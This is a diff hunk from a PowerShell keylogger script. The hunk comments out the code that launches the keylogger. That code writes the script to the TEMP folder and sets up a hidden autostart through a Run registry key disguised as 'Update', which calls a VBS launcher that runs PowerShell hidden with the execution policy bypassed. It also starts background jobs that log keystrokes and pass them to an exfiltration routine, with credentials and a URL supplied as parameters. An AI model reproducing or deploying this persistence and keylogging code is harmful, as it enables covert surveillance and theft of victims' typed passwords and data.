@@ -356,36 +356,36 @@ function script:Keylogger
 
 
 
-    $modulename = $script:MyInvocation.MyCommand.Name
-    if($persist -eq $True)
-    {
-        $name = "persist.vbs" 
-        $options = "start-job -InitializationScript `$functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)"
-        $options2 = "start-job -InitializationScript `$functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)"
-        $func = $functions.Tostring()
-        Out-File -InputObject '$functions =  {' -Force $env:TEMP\$modulename
-        Out-File -InputObject $func -Append $env:TEMP\$modulename
-        Out-File -InputObject '}' -Append -NoClobber $env:TEMP\$modulename
-        Out-File -InputObject $options -Append -NoClobber $env:TEMP\$modulename
-        Out-File -InputObject $options2 -Append -NoClobber $env:TEMP\$modulename
+# $modulename = $script:MyInvocation.MyCommand.Name
+    # if($persist -eq $True)
+    # {
+        # $name = "persist.vbs" 
+        # $options = "start-job -InitializationScript `$functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)"
+        # $options2 = "start-job -InitializationScript `$functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)"
+        # $func = $functions.Tostring()
+        # Out-File -InputObject '$functions =  {' -Force $env:TEMP\$modulename
+        # Out-File -InputObject $func -Append $env:TEMP\$modulename
+        # Out-File -InputObject '}' -Append -NoClobber $env:TEMP\$modulename
+        # Out-File -InputObject $options -Append -NoClobber $env:TEMP\$modulename
+        # Out-File -InputObject $options2 -Append -NoClobber $env:TEMP\$modulename
            
-        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
-        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
-        echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
+        # New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
+        # echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
+        # echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
 
-    }  
+    # }  
 
-    else
-    {
-        if ($exfil -eq $True)
-        {
-            start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
-            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
-        }
-        else
-        {
-            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
-        }
-    }
+    # else
+    # {
+        # if ($exfil -eq $True)
+        # {
+            # start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
+            # start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+        # }
+        # else
+        # {
+            # start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+        # }
+    # }
 
 
